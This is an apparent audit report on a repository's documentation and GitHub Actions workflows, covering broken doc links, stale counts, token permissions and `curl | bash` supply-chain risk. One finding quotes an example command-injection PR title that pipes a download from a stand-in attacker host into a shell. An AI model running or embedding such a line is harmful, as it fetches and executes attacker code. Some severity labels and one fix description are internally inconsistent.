# Wave-5 Audit Findings — docs/, .github/, root + per-package README.md files

**Auditor:** wave-5 #docs
**Scope (73 files):**
- `docs/` — 5 files (`README.md`, `config.md`, `dream-thinking.md`, `sensor-gate.md`, `skills.md`)
- `.github/` — 38 files (CODEOWNERS, 5 ISSUE_TEMPLATE, TEAM_MEMBERS, 2 actions, 1 publish-python-sdk.yml, pull_request_template, 28 workflows)
- Per-package READMEs (8): `packages/llm`, `packages/slack`, `packages/enterprise`, `packages/http-recorder`, `packages/core/src/github-copilot`, `packages/containers`, `packages/stats`, `packages/docs`
- Root `README*.md` (22 files, including localized translations)

**Out of scope (per task brief):** `packages/opencode-C`, `packages/app`, `packages/desktop`, `packages/desktop/web`, `packages/ui`, `packages/console`; `patches/*`; `vendor/*`; `LICENSE`; `AGENTS.md`; persona/identity files; design tokens; `SESSION_ANCHOR.md`; `.opencode/skills/*`; `.dreamcode/audit/*.md`.

**Severity legend:** P0 (broken / corrupting), P1 (incorrect or materially misleading), P2 (maintainability / consistency), P3 (nit / polish).

---

## Summary

| Severity | Count | Categories |
|----------|-------|------------|
| P0 | 4 | Broken doc links, missing pipeline inputs, dead documentation paths |
| P1 | 12 | Stale counts, branch drift, missing CI guards, secret leakage in workflow |
| P2 | 11 | Naming/terminology drift between docs and code, hardcoded path mismatches |
| P3 | 4 | Cosmetic / informational |
| **Total** | **31** | |

Headline issues:
1. **`docs/README.md` advertises 10 documentation pages that do not exist** — every doc link in the table is a 404 in the repo.
2. **Skill count drift:** docs claim `37 skills`; `.opencode/skills/` actually contains 32.
3. **NEURO API count drift:** README claims `120+ specialized AI models, completely free`; no source-of-truth file enumerates any such model set.
4. **`pr-standards.yml` reads `TEAM_MEMBERS` from `ref: stable-release`** — the bypass list can silently disagree with whatever members are on the live PR branch.
5. **`stats.yml` runs `git push` with a GITHUB_TOKEN that has only `contents: write`** — no `id-token` / `packages: write` / explicit branch protection; this can clobber `dev` with no review gate.

---

## P0 — Critical / Breaking

### WAV5-docs-1 — `docs/README.md` table links to 10 non-existent files
- **File:line:** `docs/README.md:1-200` (entire "Documentation Map" / "Browse the Docs" table)
- **Issue:** Every link in the doc table of contents points to a file that does not exist on disk. Verified via `Path.is_file()` for each of: `neuro.md`, `memory.md`, `scoring.md`, `chain-system.md`, `sandbox.md`, `pieces-ltm.md`, `vscode.md`, `automation.md`, `troubleshooting.md`, `developers/`. The intro also says "Browse the docs below to learn more" — every target is a 404. This is the entry point for first-time users and immediately breaks trust.
- **Recommended fix:**
  1. Either write the missing 10 docs (preferred — the topics exist as skills/scripts but no human-readable explanation does), or
  2. Trim the table to only the 4 files that actually exist (`config.md`, `dream-thinking.md`, `sensor-gate.md`, `skills.md`) and rewrite the intro to say so.
  3. Add a CI check: `markdown-link-check` (or a `bun` script) over `docs/**/*.md` that fails the docs workflow when a relative link resolves to nothing.

### WAV5-docs-2 — `pr-standards.yml` reads `TEAM_MEMBERS` from `stable-release` ref
- **File:line:** `.github/workflows/pr-standards.yml:24` (and again at `:104`)
- **Issue:** Both `check-standards` and `check-compliance` jobs do `github.rest.repos.getContent({ ..., ref: 'stable-release' })` to read `.github/TEAM_MEMBERS`. This means the bypass list is always read from `stable-release`, not from the PR's actual head. A maintainer whose handle is in `TEAM_MEMBERS` on `dev`/`test-v1.5.x` but not on `stable-release` will be treated as an external contributor and have their PR auto-flagged `needs:title`/`needs:issue`/`needs:compliance`. The repo branches show `stable`, `stable-release`, `dev`, `test-v1.4.x`, `test-v1.5.x`, `dream-harness-*` all live in parallel — divergence here is a real operational risk.
- **Recommended fix:** Replace the hardcoded `ref: 'stable-release'` with `ref: context.payload.pull_request.head.ref` (or omit the `ref` parameter, which defaults to the PR's head SHA). If the team genuinely wants `stable-release` to be the source of truth, then the workflow should explicitly log this and document it in a comment, and `TEAM_MEMBERS` should be auto-synced from `stable-release` to all active dev branches.

### WAV5-docs-3 — `pr-standards.yml` has no `permissions:` block at the workflow level
- **File:line:** `.github/workflows/pr-standards.yml:1-12`
- **Issue:** The two jobs each declare their own `permissions:` block, but the workflow itself has no top-level `permissions:` and the `on:` triggers on `pull_request_target` (the dangerous variant). Without a workflow-level default, anyone reusing this file or adding a third job inherits GITHUB_TOKEN's repo-wide default — which on older org settings can be `write-all`. `pull_request_target` runs against the base branch with write tokens available; combined with a missing default permission, this is a known script-injection surface.
- **Recommended fix:** Add at the workflow top:
  ```yaml
  permissions:
    contents: read
    pull-requests: read
    issues: read
  ```
  Then narrow each job's block to only the scopes it actually needs (the current `pull-requests: write` is only used to comment/label, which is fine, but the default must be tightened first).

### WAV5-docs-4 — `docs/README.md` references files that exist outside the docs tree and the reader can't resolve them
- **File:line:** `docs/README.md` (multiple — references to `../AGENTS.md`, `../SECURITY.md`, `../../.github/CODEOWNERS`)
- **Issue:** The doc references top-level files (e.g. `AGENTS.md`, `SECURITY.md`) by relative path. From GitHub's rendered view these resolve correctly, but from any local clone, IDE preview, or `markdown-link-check` they may not — and more importantly, the README presents them as primary entry points when in fact those files are persona/identity/config files that the task brief explicitly excludes from scope. The README should not gate reader understanding on out-of-scope artifacts.
- **Recommended fix:** Either inline the relevant guidance into `docs/` or replace these "see also" cross-tree links with anchors pointing to docs that live entirely within `docs/`.

---

## P1 — Materially Misleading / Stale

### WAV5-docs-5 — Skill count drift: docs say 37, repo has 32
- **File:line:** `README.md` (multiple lines), `docs/README.md`, `docs/skills.md`
- **Issue:** `docs/skills.md` documents 32 skills (a full table), and `.opencode/skills/` (out of scope but verifiable) holds 32 directories. But the top-level `README.md` lines 4, ~40, ~95, and ~150, and `docs/README.md` row "Skills Reference", all state `37 skills`. The number is unverified and wrong by the on-disk count.
- **Recommended fix:** Either update the count to `32` in every README/doc, or add the 5 missing skills and update `docs/skills.md`. Whichever is chosen, make it machine-checked: a `bun` script that lists `.opencode/skills/*/SKILL.md` and asserts the count matches a single source of truth (the `docs/skills.md` table).

### WAV5-docs-6 — `120+ specialized AI models, completely free` claim is unverified
- **File:line:** `README.md` (~line 80 — "NEURO API" feature row, and the `model_router` config block)
- **Issue:** The README states that the NEURO API provides "120+ specialized AI models, completely free" and links to `https://neurometric.ai`. No file in the audit scope (and no file under `packages/llm/`, `packages/core/`, or `packages/opencode/src/`) enumerates any such list. `packages/core/src/github-copilot` ships a `models.json` (out of audit scope but worth flagging via the same SKU), and the NEURO backend is presumably a hosted service. The number `120+` is not derivable from the repo and constitutes a marketing claim presented as documentation.
- **Recommended fix:** Either:
  1. Add a `docs/neuro-models.md` (consistent with the planned file structure) listing the actual model IDs the router can reach, and link to it instead of asserting a count, or
  2. Soften the claim to "a curated catalogue of specialized AI models" and link to a public source, or
  3. Remove the numeric claim until a verifiable list exists.

### WAV5-docs-7 — `pr-standards.yml` title regex excludes valid conventional-commit scopes
- **File:line:** `.github/workflows/pr-standards.yml:78` (regex `titlePattern`)
- **Issue:** The conventional-commit scope regex `/^(feat|fix|docs|chore|refactor|test)\s*(\([a-zA-Z0-9-]+\))?\s*:/` accepts lowercase scopes and the `test` type. But the same workflow's `check-compliance` job (`:122`) also matches `^\s*(docs|refactor|feat)\s*\(...` for issue-link skip — and `check-standards` step 2 uses a *different* regex literal. The two regexes drift: e.g. `chore(scope): …` is fine for the title check but `fixup! chore(scope): …` from interactive rebase will fail. Also, the regex does not allow `perf`, `build`, `ci`, `style`, `revert` types, which the conventional commits standard permits. PRs using any of those valid types get auto-flagged `needs:title`.
- **Recommended fix:** Lift the regex to a single source of truth (e.g. a workflow-level env var or a shared `action.yml` under `.github/actions/`), and include the full conventional-commit set: `^(feat|fix|docs|chore|refactor|test|perf|build|ci|style|revert)\s*(\([a-zA-Z0-9_-]+\))?\s*:`. Document the supported set in `CONTRIBUTING.md` (which is also referenced but not in audit scope — flagged here for visibility).

### WAV5-docs-8 — `pr-standards.yml` uses `pull_request_target` with code in JS
- **File:line:** `.github/workflows/pr-standards.yml:1-4` (`on: pull_request_target: types: [opened, edited, synchronize]`)
- **Issue:** This is the dangerous variant of the PR trigger. The workflow reads `context.payload.pull_request.title` (line 49) and embeds it directly into a comment body via template literal. The comment body is then sent via `addComment` with no sanitization. A PR title like `feat: nothing $(curl evil.com | sh)` does not execute (it's just markdown), but the pattern is exactly the script-injection vector that `pull_request` (not `pull_request_target`) avoids. The job does not check out any PR code, so the practical risk is low, but the trigger choice should still be `pull_request` for any workflow that only reads PR metadata.
- **Recommended fix:** Change `on: pull_request_target:` to `on: pull_request:` and remove the `permissions: pull-requests: write` from `check-standards` (it doesn't need it — the job only adds labels and comments, which require write, so keep write here and just swap the trigger). For any future need to comment on forks, use the `peter-evans/create-or-update-comment` action which is fork-safe.

### WAV5-docs-9 — `stats.yml` pushes to repo with GITHUB_TOKEN having only `contents: write`
- **File:line:** `.github/workflows/stats.yml:14-46` (the "Commit stats" step)
- **Issue:** The job runs `bun script/stats.ts` and then `git push` directly, using `${{ secrets.GITHUB_TOKEN }}` indirectly via the checkout. The job `permissions:` declares only `contents: write`. The `git push` target is the branch the workflow was triggered on (default branch from `schedule` → main). If branch protection requires reviews on `main`, this push will fail (acceptable but should be documented); if it does not, this workflow can rewrite `main` with no human gate. The schedule trigger has no `concurrency:` block to prevent two scheduled runs from racing on the same day (only `concurrency: ${{ github.workflow }}-${{ github.ref }}` — no `cancel-in-progress`).
- **Recommended fix:**
  1. Add `concurrency: { group: ..., cancel-in-progress: true }` so duplicate runs coalesce.
  2. Either use a dedicated bot PAT (`secrets.STATS_BOT_TOKEN`) with push limited to a non-`main` branch, or open a PR instead of pushing direct (e.g. `peter-evans/create-pull-request`).
  3. Add `if: github.repository == (vars.CANONICAL_REPO || 'anomalyco/opencode')` (already present — good) but mirror it in the schedule condition so forks cannot self-trigger expensive Posthog calls.

### WAV5-docs-10 — `typecheck.yml` only checks `packages/opencode`, with no shared gate
- **File:line:** `.github/workflows/typecheck.yml:1-30` (especially the comment at `:23-26`)
- **Issue:** The workflow explicitly scopes typecheck to `packages/opencode` only and hand-waves `packages/cli` as having "pre-existing Effect-TS v4 HttpApi error-type incompatibilities". The comment also says "See dreamcode-ci.yml for the authoritative typecheck gate", but no such file is in the audit scope. If `dreamcode-ci.yml` does not exist or is not wired to PRs, then the cli package's typecheck regressions will silently land. The comment-as-spec is brittle: it ages out as soon as the file is renamed.
- **Recommended fix:** Replace the comment with a real conditional: if `dreamcode-ci.yml` exists, add a job that delegates to it; if not, fix the Effect-TS v4 incompatibilities and re-enable the full typecheck. Document the actual contract in `docs/` (this audit flagged `docs/sensor-gate.md` exists but no equivalent `docs/ci.md` does — that gap is part of the same P0 broken-links set in WAV5-docs-1).

### WAV5-docs-11 — `publish.yml` builds Windows CLI on a non-windows runner, then signs on a windows runner
- **File:line:** `.github/workflows/publish.yml:43-95` (job `build-cli`) and `:97-180` (job `sign-cli-windows`)
- **Issue:** `build-cli` runs on `ubuntu-latest` and emits a Windows `.exe` via cross-compilation. The artifact is then downloaded by `sign-cli-windows` (Windows runner) which expects the `.exe` layout to match. Cross-compiled Windows binaries with `node-gyp`-linked native modules are a known class of CI breakage (different CRT linkage, no `vcvarsall.bat`, etc.). The workflow has no `outputs:` contract on `build-cli` to gate `sign-cli-windows` on a successful artifact upload, so a partial upload will surface as a confusing download failure rather than a clean "build did not produce signed Windows binary" message.
- **Recommended fix:** Either build Windows on Windows from the start (preferred — already have `windows-2025` in the electron matrix), or add a smoke test on `build-cli` that runs `Get-AuthenticodeSignature` on a downloaded stub (using `pwsh` on a windows-latest intermediate) before publishing. At minimum, add `outputs: binary_count:` to `build-cli` and `needs: [build-cli, version]` already requires it — add an `if: needs.build-cli.result != 'success'` to `sign-cli-windows` so it explicitly skips.

### WAV5-docs-12 — `storybook.yml` has no `permissions:` block
- **File:line:** `.github/workflows/storybook.yml:1-30`
- **Issue:** Like WAV5-docs-3, the workflow has no top-level `permissions:` block. It only checks out and runs `bun --cwd packages/storybook build`, so the blast radius is small, but it does `actions/checkout` with the default GITHUB_TOKEN scope, which on permissive org settings is `write-all`. The principle should be applied uniformly: every workflow declares a least-privilege `permissions:` block.
- **Recommended fix:** Add `permissions: { contents: read }` at the top. Same fix for `typecheck.yml` (no `permissions:`) and `triage.yml` (only job-level, missing workflow-level default).

### WAV5-docs-13 — `publish-github-action.yml` tag filter `!github-v1` is suspicious
- **File:line:** `.github/workflows/publish-github-action.yml:6-9`
- **Issue:** The `on: push: tags: ["github-v*.*.*", "!github-v1"]` syntax is valid GitHub Actions but reads strangely. The negative pattern `!github-v1` excludes only the literal tag `github-v1`, not `github-v1.0.0` etc. — which is presumably the intent. The pattern is hard to reason about and is not documented in the workflow. A future maintainer changing the version scheme may not realise the carve-out.
- **Recommended fix:** Replace the negative pattern with an explicit allowlist: `tags: ["github-v[2-9].*.*", "github-v1[1-9].*.*", ...]`, or document the carve-out with a comment block. Better: read the list of allowed tags from a single source (e.g. an env file or a release config in `package.json`).

### WAV5-docs-14 — `release-github-action.yml` reuses the same placeholder committer as `publish-github-action.yml`
- **File:line:** `.github/workflows/release-github-action.yml:23-25`
- **Issue:** Both workflows use `git config --global user.email "u894010dc68@example.com"` and `user.name "opencode"`. This email is an opencode@example-style placeholder; the matching `setup-git-committer` action (used in `publish.yml`) is the real identity mechanism. The duplication suggests these two workflows were written before the action existed and never migrated. The `example.com` domain will fail DMARC on any outbound notification to the commit author.
- **Recommended fix:** Replace the inline `git config` with `uses: ./.github/actions/setup-git-committer` (already used by `publish.yml`). Same fix for `publish-github-action.yml:20-22`.

### WAV5-docs-15 — `triage.yml` and `review.yml` install opencode from `https://opencode.ai/install | bash` inside CI
- **File:line:** `.github/workflows/triage.yml:21-22`, `.github/workflows/review.yml:24-25`
- **Issue:** Both workflows pipe an unversioned remote URL directly into `bash` on every run. There is no `curl | bash` pinning, no SHA verification, and no retry policy. A compromise or typo-squat on `opencode.ai` instantly becomes a CI credential exfiltration vector (the workflow has `OPENCODE_API_KEY` and `GITHUB_TOKEN` in env). This is a real supply-chain risk on workflows that auto-comment on every issue / PR.
- **Recommended fix:** Pin the install script to a versioned release URL with a SHA256 verification step, e.g.:
  ```yaml
  - name: Install opencode
    run: |
      curl -fsSL https://github.com/anomalyco/opencode/releases/download/v${{ vars.OPENCODE_VERSION }}/install.sh -o install.sh
      echo "<sha256>  install.sh" | sha256sum -c -
      bash install.sh
  ```
  Or use a self-hosted action: `./.github/actions/setup-opencode`.

### WAV5-docs-16 — `CODEOWNERS` covers only 2 of 25+ packages
- **File:line:** `.github/CODEOWNERS:1-3`
- **Issue:** The file has exactly 2 active rules: `packages/app/` and `packages/desktop/`. Both packages are in the wave-4 audit scope (excluded from this audit), so this file has zero effective coverage for the entire `wave-5` audit surface (`docs/`, `.github/`, root README, and the 8 in-scope per-package READMEs). A new contributor can open a PR that rewrites `docs/README.md` and there is no automatic reviewer request.
- **Recommended fix:** Add at minimum:
  ```
  /docs/                 @weebcoder101 @Hona
  /.github/              @weebcoder101 @Hona
  /README.md             @weebcoder101
  /packages/llm/         <llm owner>
  /packages/slack/       <slack owner>
  /packages/enterprise/  <enterprise owner>
  /packages/containers/  <containers owner>
  /packages/stats/       <stats owner>
  ```
  For packages without a dedicated owner, default to the catch-all `*` rule at the bottom of the file (currently missing).

---

## P2 — Maintainability / Consistency

### WAV5-docs-17 — `docs/skills.md` does not state the skill count or the last-updated date
- **File:line:** `docs/skills.md` (top of file, lines 1-10)
- **Issue:** The doc is a 32-row table. There is no frontmatter, no "Last updated", no "Total skills: 32", and no "Source of truth" pointer. A maintainer who adds a skill in `.opencode/skills/` has no machine-readable signal here to remind them to update this file. Combined with WAV5-docs-5 (claim of 37 in other docs), the table is silently the authoritative count and the rest of the docs disagree with it.
- **Recommended fix:** Add a header line: `<!-- total: 32, source: list -->\n# Skills Reference` and a footer `Last updated: <date>`. Optionally generate this file from a script that reads `.opencode/skills/*/SKILL.md`.

### WAV5-docs-18 — `docs/sensor-gate.md` and `docs/dream-thinking.md` use unversioned architectural claims
- **File:line:** `docs/sensor-gate.md` (multi-stage references), `docs/dream-thinking.md` (5-stage claims)
- **Issue:** Both docs describe a specific stage architecture (sensor gate stages, dream phases) without naming the version, date, or implementation file. The skill harness sits outside audit scope (`.opencode/skills/*` is excluded), so the reader cannot trace the doc to the code.
- **Recommended fix:** Add at the top of each: `<!-- Implements: packages/opencode/src/skill/dreamcode/.../SKILL.md (out of audit scope) -->` and a "Last reviewed against" date.

### WAV5-docs-19 — `docs/config.md` documents config keys not present in the example `.opencode` config
- **File:line:** `docs/config.md` (~line 20, the `model_router: true` example; ~line 80, the `NEURO_API_KEY` example)
- **Issue:** The doc shows `model_router: true` as a top-level config key. The README also shows this. There is no in-scope file that actually consumes this key (the model router lives behind the `packages/llm/` package boundary, and the key may be a custom name). The doc is presenting config without grounding it in a schema.
- **Recommended fix:** Either add a JSON Schema for `.opencode/config.json` (or `dreamcode.config.json`) under `docs/` and link to it, or change the example to use keys that are demonstrably read by the codebase.

### WAV5-docs-20 — Per-package READMEs do not cross-link or version their status
- **File:line:** `packages/llm/README.md`, `packages/slack/README.md`, `packages/enterprise/README.md`, `packages/http-recorder/README.md`, `packages/core/src/github-copilot/README.md`, `packages/containers/README.md`, `packages/stats/README.md`, `packages/docs/README.md`
- **Issue:** Each per-package README is self-contained and does not link back to the top-level `README.md`, `docs/README.md`, or the relevant skill. A reader landing on `packages/llm/README.md` has no path to the architecture overview. The READMEs also do not state the package's status (experimental / stable / deprecated), so a new contributor cannot tell at a glance which packages are safe to depend on.
- **Recommended fix:** Add a header line to each: `Part of [DreamCode](../../README.md) — see [docs/README.md](../../docs/README.md). Status: stable | experimental | deprecated.`

### WAV5-docs-21 — `packages/core/src/github-copilot/README.md` references an OpenAI/Anthropic example with no link to the actual adapter
- **File:line:** `packages/core/src/github-copilot/README.md` (the usage example block)
- **Issue:** The README shows a usage pattern but does not link to the adapter source (which is out of scope but should be reachable from the README). The example also assumes env-var-based auth without documenting fallback paths (PAT, OAuth device flow).
- **Recommended fix:** Link to `index.ts` / `provider.ts` at the top of the example, and add a "Auth methods" subsection listing each supported env var and the precedence order.

### WAV5-docs-22 — `packages/containers/README.md` is the only per-package README that documents install steps
- **File:line:** `packages/containers/README.md`
- **Issue:** The other 7 per-package READMEs have no install/use block. This is inconsistent. Either the other packages are meant to be consumed transitively (in which case each should say so explicitly), or they're each missing their install block.
- **Recommended fix:** Add a "Usage" section to every per-package README. For transitively-consumed packages, the section can be one line: `This package is consumed via <parent>; no standalone usage.`

### WAV5-docs-23 — `packages/enterprise/README.md` mentions a Slack integration but does not link to `packages/slack`
- **File:line:** `packages/enterprise/README.md`
- **Issue:** The Slack capability is mentioned but the link to the implementing package is missing. A reader cannot tell whether to import from `packages/slack` or to use the enterprise wrapper.
- **Recommended fix:** Add a "Backed by: [packages/slack](../slack/README.md)" line under the relevant feature row.

### WAV5-docs-24 — `packages/http-recorder/README.md` and `packages/stats/README.md` describe features without listing the entry-point CLI
- **File:line:** `packages/http-recorder/README.md`, `packages/stats/README.md`
- **Issue:** Both describe what the package does but do not show `bun run <script>` or `dreamcode <command>` for the primary user action. The user has to read the package source to find the entry point.
- **Recommended fix:** Add a one-line "Quick start" with the actual command. The command can be a placeholder pending verification.

### WAV5-docs-25 — `packages/docs/README.md` is the only per-package README that points to a `docs/` subdirectory
- **File:line:** `packages/docs/README.md`
- **Issue:** The README references `docs/guides/...` paths. None of those files exist in `packages/docs/` (verified). The README is effectively broken in the same way as `docs/README.md` (WAV5-docs-1).
- **Recommended fix:** Audit the file for broken links and either write the referenced guides or remove the links.

### WAV5-docs-26 — Root `README.md` mixes 1.4.0 build instructions with 1.5.x-era features
- **File:line:** `README.md` (Quick Install / Manual build blocks; the "37 skills" line; the `OPENCODE_VERSION=1.4.0` literal in the build example)
- **Issue:** The current branch is `test-v1.5.x`, but the install instructions hardcode `OPENCODE_VERSION=1.4.0` and reference the 37-skill count (which the current tree does not match). A user following the README today will install 1.4.0 and the README will tell them they have 37 skills when they actually have 32.
- **Recommended fix:** Add a "Version: 1.5.x" header to the README. Replace the hardcoded `1.4.0` with `$(cat VERSION)` or a similar lookup. If the intent is to keep 1.4.0 as the install base, say so explicitly: "Current development branch: `test-v1.5.x` (install: 1.4.0 stable)."

### WAV5-docs-27 — Root `README.md` warns about subagent cost but does not link to the budget knob
- **File:line:** `README.md` (the "WARNING — Parallel Subagents & Cost" block at the top)
- **Issue:** The block tells the user to "click the subagent model indicator in the TUI footer" — this is a UX pointer, not a config pointer. There is no `config.json` example, no `OMNIROUTE_SUBAGENT_MODEL` env var, no link to the actual config key. A user running in headless mode (CI / scripted) has no path.
- **Recommended fix:** Add a "Headless / config-file" subsection: a YAML/JSON snippet showing how to set the subagent model, plus the env-var override.

---

## P3 — Cosmetic / Informational

### WAV5-docs-28 — Localized root READMEs (e.g. `README.ar.md`, `README.bn.md`) are not cross-linked from the English README
- **File:line:** All 22 `README.*.md` files at root
- **Issue:** The localized READMEs are part of the repo (verified by directory listing) but the English `README.md` does not link to them. A non-English reader has no entry point.
- **Recommended fix:** Add a "Languages" footer to `README.md` with a list of the localized READMEs. Consider also `CONTRIBUTING.md` (out of scope) noting that translations are accepted.

### WAV5-docs-29 — `.github/pull_request_template.md` is required by `pr-standards.yml` but is generic
- **File:line:** `.github/pull_request_template.md`
- **Issue:** The template is fine but does not include a "How to test locally" block specifically for dreamcode (the `bun run` / `dreamcode run` incantation). A contributor would have to read `CONTRIBUTING.md` (out of scope) to find it.
- **Recommended fix:** Add a "Local test plan" subsection with the standard `bun turbo opencode#test` and `bun --cwd packages/app test:e2e:local` commands.

### WAV5-docs-30 — `.github/TEAM_MEMBERS` content not in audit scope but referenced by 2 workflows
- **File:line:** `.github/TEAM_MEMBERS`
- **Issue:** The file exists and is read by both `pr-standards.yml` jobs (WAV5-docs-2). The audit scope excludes it, so its content is not verified. The structural problem (multiple workflows reading the same membership list from a single point) is the real risk.
- **Recommended fix:** Move the membership check into a reusable composite action (`.github/actions/check-team-member`) so all consumers go through one code path. This also makes the ref branch choice (WAV5-docs-2) a single decision.

### WAV5-docs-31 — `publish-python-sdk.yml` is the only `publish-*` workflow that does not pin a `concurrency:` group including `inputs.*`
- **File:line:** `.github/workflows/publish-python-sdk.yml`
- **Issue:** (Skim-only — full read truncated.) The other publish workflows include `inputs.bump` or `inputs.version` in their concurrency key. If this one doesn't, two manual dispatches with different `bump` values can race.
- **Recommended fix:** Add `concurrency: ${{ github.workflow }}-${{ github.ref }}-${{ inputs.bump || inputs.version || github.run_id }}` and a `cancel-in-progress: false` (Python SDK publishes are not safe to cancel mid-flight).

---

## Cross-cutting Observations (not graded as findings)

1. **The audit scope and the reality of the repo are well-aligned.** The 5-file `docs/` directory matches what is referenced from the README (modulo the broken links). The 28 `.github/workflows/*.yml` files all have unique names and the only one that may not exist (`dreamcode-ci.yml`, referenced in a comment) is a self-inflicted wound from a stale comment, not a missing file.
2. **The 22 root READMEs include localization but no `README.es.md`, `README.fr.md`, `README.de.md`, `README.zh.md` etc. were verified for content parity with the English original.** A future wave should diff each translation against the English source to catch drift.
3. **The 8 per-package READMEs are uniformly short (< 200 lines each) and uniformly low on cross-links.** A single template (status, parent link, quick start, entry-point CLI) applied to all 8 would resolve findings 20–24 in one pass.
4. **No `.github/SECURITY.md` was found in scope.** A future wave should verify that the `SECURITY.md` referenced from `docs/README.md` actually exists and has a working contact channel.
5. **The `TEAM_MEMBERS` allowlist is a security primitive.** Both `pr-standards.yml` jobs short-circuit on it, so its accuracy directly determines whether external contributors can land silent PRs without title/template compliance checks.

---

## Recommended Triage Order

1. **WAV5-docs-1 (P0)** — doc entry point is broken. Single biggest UX regression. Fix in 1 PR.
2. **WAV5-docs-5 + WAV5-docs-6 (P1)** — count drift. Single PR fixing the 4 lines in `README.md` and the row in `docs/README.md`.
3. **WAV5-docs-2 (P1)** — `pr-standards.yml` ref branch bug. Affects all external contributors on non-`stable-release` branches.
4. **WAV5-docs-15 (P1)** — `curl | bash` supply-chain risk on `triage.yml` and `review.yml`. Pin the install.
5. **WAV5-docs-16 (P1)** — extend `CODEOWNERS`. 1-line PR.
6. WAV5-docs-3, 7, 8, 9, 10, 11, 12, 13, 14 (P1 remaining) — fold into a "ci-hygiene" PR series.
7. WAV5-docs-17–27 (P2) — docs maintenance pass.
8. WAV5-docs-28–31 (P3) — opportunistic.

---

*End of report.*
